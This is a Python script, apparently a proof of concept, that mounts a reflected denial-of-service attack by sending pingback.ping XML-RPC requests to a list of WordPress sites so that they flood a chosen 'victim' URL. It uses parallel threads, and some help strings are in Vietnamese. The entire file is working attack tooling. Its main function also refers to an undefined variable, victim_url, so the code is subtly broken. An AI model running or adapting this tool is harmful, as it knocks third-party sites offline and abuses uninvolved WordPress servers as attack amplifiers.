import requests
import argparse
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

def send_pingback(victim_url, wp_site, post_path):
    payload = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>{victim_url}</string></value></param>
    <param><value><string>{wp_site.rstrip('/')}/{post_path.lstrip('/')}</string></value></param>
  </params>
</methodCall>"""

    headers = {"Content-Type": "text/xml"}
    xmlrpc_url = f"{wp_site.rstrip('/')}/xmlrpc.php"

    try:
        r = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=5)
        if r.status_code == 200:
            print(f"[+] Pingback sent from {wp_site}")
        else:
            print(f"[-] {wp_site} returned status {r.status_code}")
    except Exception as e:
        print(f"[!] Error sending request to {wp_site}: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="Pingback DDoS PoC via xmlrpc.php",
        usage="python3 %(prog)s --host <victim_url> [--file wp_sites.txt] [--threads 100]"
    )
    parser.add_argument("--host", required=True, help="Victim URL (target of DDoS)")
    parser.add_argument("--file", default="wp_sites.txt", help="File chứa danh sách URL bài viết WordPress")
    parser.add_argument("--threads", type=int, default=1, help="Số luồng chạy song song (mặc định: 1)")

    args = parser.parse_args()

    with open(args.file, "r") as f:
        urls = [line.strip() for line in f if line.strip()]

    tasks = []
    for full_url in urls:
        parsed = urlparse(full_url)
        domain = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path.strip("/")
        if path == "":
            print(f"[-] {full_url} không có đường dẫn bài viết.")
            continue
        tasks.append((victim_url, domain, path))

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for victim_url, domain, path in tasks:
            executor.submit(send_pingback, victim_url, domain, path)

if __name__ == "__main__":
    main()
